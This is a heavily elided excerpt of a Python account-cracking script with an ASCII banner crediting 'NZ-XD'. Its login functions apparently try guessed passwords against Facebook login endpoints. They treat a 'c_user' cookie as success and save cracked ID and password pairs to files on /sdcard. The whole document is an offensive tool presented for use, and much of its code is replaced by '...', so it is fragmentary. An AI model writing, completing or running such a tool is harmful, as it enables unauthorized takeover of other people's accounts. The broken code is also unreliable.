...
os.system("xdg-open https://github.com/NZ-XD")
#app  check 
...
\____|__  /_____ \  |____|_  /(____  /___|  (____  /
        \/      \/         \/      \/     \/     \/ 
[+]==============================================
[+] CREATED BY   :  REETVIK RANA
[+] FB GROUP     :  BEAST KINGDOM FAMILY
[+] ON GITHUB    :  NZ-XD
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.2
[+]=============================================="""
...
def NZ1():
	...
	print('[?] Ids saved in NZ-OK.txt,NZ-CP.txt')
...
def mbasic(uid,pwx,tl):
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[NZ-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in NZ_xd:
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[NZ-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/NZ-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/NZ-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-NZ] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-NZ] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-NZ] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-NZ] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-NZ] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-NZ] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
